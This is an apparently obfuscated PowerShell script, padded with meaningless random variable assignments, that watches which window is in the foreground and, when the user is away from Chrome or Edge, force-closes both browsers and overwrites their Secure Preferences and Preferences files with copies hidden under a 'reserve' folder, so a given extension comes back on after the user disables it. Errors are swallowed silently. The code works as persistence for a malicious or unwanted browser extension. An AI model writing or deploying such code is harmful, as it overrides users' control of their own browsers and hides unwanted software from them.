$QBWsRVBXMoceAvMDT3DI = $ouEp7sK1AwcbJZXsfnwt
$QC5wasfy6w6o8BNJtDnF = $gvkBKkDoBLxC9oTmzuO2
$JHEpXYb8z4HFKvP9Fdmr = $AirlhKyC8cZHV72ZktoV
$XfcU43vt5iXAJJRujn9i = $rQK3QnnstPJUWlJOth4I
$1v9OsWrSrWe078ko7zwt = $rZYPoxZmAMpyeYTxJGtN
$218Ql2i2SFPGIRXOj95c = $BIHdcd5md2A0mXzyliub
$W5OuLrRswfrq1nUoi6oY = $6voiQ7GFSJbPuBlCCibg
$cUAVQ9fq8fC0JVfR9zqe = $POpbHMujJSGCeQadYNin
$fq2nf2unfUWL2nMA1nPN = $22m3X8su3Xc0GbkvhWq7
$sEHY0B4pn1RvvoO72jC8 = $BACsmUnMm4JfTjFx98u6
$FOkGyrIC0aPuMqohFFbq = $VZPE0siX7vajEoQ4TjrN
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public class User32 {
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll", SetLastError=true)]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
    [DllImport("user32.dll")]
    public static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
    [DllImport("user32.dll")]
    public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
    public struct LASTINPUTINFO {
        public uint cbSize;
        public uint dwTime;
    }
}
"@

function Get-ActiveWindowProcessId {
    $hwnd = [User32]::GetForegroundWindow()
    $processId = 0
    [void][User32]::GetWindowThreadProcessId($hwnd, [ref]$processId)
    return $processId
}

function Is-BrowserWindowActive {
    $activeProcessId = Get-ActiveWindowProcessId
    $chromeProcessIds = (Get-Process -Name "chrome" -ErrorAction SilentlyContinue).Id
    $edgeProcessIds = (Get-Process -Name "msedge" -ErrorAction SilentlyContinue).Id
    return ($chromeProcessIds -contains $activeProcessId) -or ($edgeProcessIds -contains $activeProcessId)
}

function Close-Browsers {
    $chromeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue
    $edgeProcesses = Get-Process -Name "msedge" -ErrorAction SilentlyContinue
    if ($chromeProcesses) {
        $chromeProcesses | ForEach-Object { $_.CloseMainWindow() | Out-Null }
        Start-Sleep -Seconds 2
        $chromeProcesses | Stop-Process -Force -ErrorAction SilentlyContinue
    }
    if ($edgeProcesses) {
        $edgeProcesses | ForEach-Object { $_.CloseMainWindow() | Out-Null }
        Start-Sleep -Seconds 2
        $edgeProcesses | Stop-Process -Force -ErrorAction SilentlyContinue
    }
}

$localappdata = $env:localappdata
$chromeProfile = "$localappdata\Google\Chrome\User Data\Default\"
$edgeProfile   = "$localappdata\Microsoft\Edge\User Data\Default\"

$chromeSecurePref = "$chromeProfile\Secure Preferences"
$edgeSecurePref   = "$edgeProfile\Secure Preferences"

$configFile = "$localappdata\reserve\config.txt"

if (Test-Path -Path $configFile) {
    $data = Get-Content -Path $configFile
    $id = $data[4].Substring(7)

    function Check-ExtensionStatus {
        param (
            [string]$BrowserName,
            [string]$SecurePrefPath,
            [string]$ExtensionId
        )
        if (Test-Path -Path $SecurePrefPath) {
            try {
                $content = Get-Content -Path $SecurePrefPath -Raw -ErrorAction Stop
                $json = $content | ConvertFrom-Json
                if ($json.extensions.settings.PSObject.Properties[$ExtensionId]) {
                    $extension = $json.extensions.settings.$ExtensionId
                    $state = $extension.state
                    if ($state -ne 1) {
                        if (-not (Is-BrowserWindowActive)) {
                            Close-Browsers
                            if ($BrowserName -eq "Chrome") {
                                $sourceSecurePref = "$localappdata\reserve\Google\Chrome\Secure Preferences"
                                $sourcePrefs        = "$localappdata\reserve\Google\Chrome\Preferences"
                                $destSecurePref     = "$chromeProfile\Secure Preferences"
                                $destPrefs          = "$chromeProfile\Preferences"
                            } elseif ($BrowserName -eq "Edge") {
                                $sourceSecurePref = "$localappdata\reserve\Microsoft\Edge\Secure Preferences"
                                $sourcePrefs        = "$localappdata\reserve\Microsoft\Edge\Preferences"
                                $destSecurePref     = "$edgeProfile\Secure Preferences"
                                $destPrefs          = "$edgeProfile\Preferences"
                            }
                            Copy-Item -Path $sourceSecurePref -Destination $destSecurePref -Force
                            Copy-Item -Path $sourcePrefs -Destination $destPrefs -Force
                        }
                    }
                }
            } catch {
                # Handle errors silently
            }
        }
    }

    Check-ExtensionStatus -BrowserName "Chrome" -SecurePrefPath $chromeSecurePref -ExtensionId $id
    Check-ExtensionStatus -BrowserName "Edge" -SecurePrefPath $edgeSecurePref -ExtensionId $id

    $checkIntervalSeconds = 60
    $nonBrowserDuration = 600
    $nonBrowserTime = 0

    for ($i = 0; $i -lt 300; $i++) {
        if (Is-BrowserWindowActive) {
            $nonBrowserTime = 0
        } else {
            $nonBrowserTime += $checkIntervalSeconds
        }
        if ($nonBrowserTime -ge $nonBrowserDuration) {
            Check-ExtensionStatus -BrowserName "Chrome" -SecurePrefPath $chromeSecurePref -ExtensionId $id
            Check-ExtensionStatus -BrowserName "Edge" -SecurePrefPath $edgeSecurePref -ExtensionId $id
            break
        }
        Start-Sleep -Seconds $checkIntervalSeconds
    }
}

$vcKk6LcohCbptb9FAf1j = $BQSwpKVROIuBRiWLdP76
$L102ZEPknaqiHkvhjP2l = $xnJuFyQ9uJKHRogswvRu
$3wVAjb60mKM0BCbmtXDH = $4Lynhls5Qja2xcfiyNAI
$CHLGxRUmH6VuzAC9HEML = $EcojxPKMP2jFpUvuoCyS
$4kxlQ2kvys0lRAkbERBr = $3X2HhKGE4DwCnUBKCHuz
$ZCEKIGZeglvk6a2cHCq8 = $njQYgzMBaBZ010ZeOH1a
$HGD6iR31B9OoT9Uszrzn = $yXuWDkqhJfbPfhODUoIj
$QGjEV2QGoFurArdHCy4Y = $DtBhCD9tkYlSxqcW5t9V
$hxhAUcmriy5s6uNe2j5r = $fm8WzzSToqR9xdagOx6p
$pl8xLrnEuwTZktfS4yYX = $i2vkglB2qI9KBRgndl6p
$WCVniCo6d2zJ4FEEHdQw = $mPYJSzCFImJW4tmmo6To
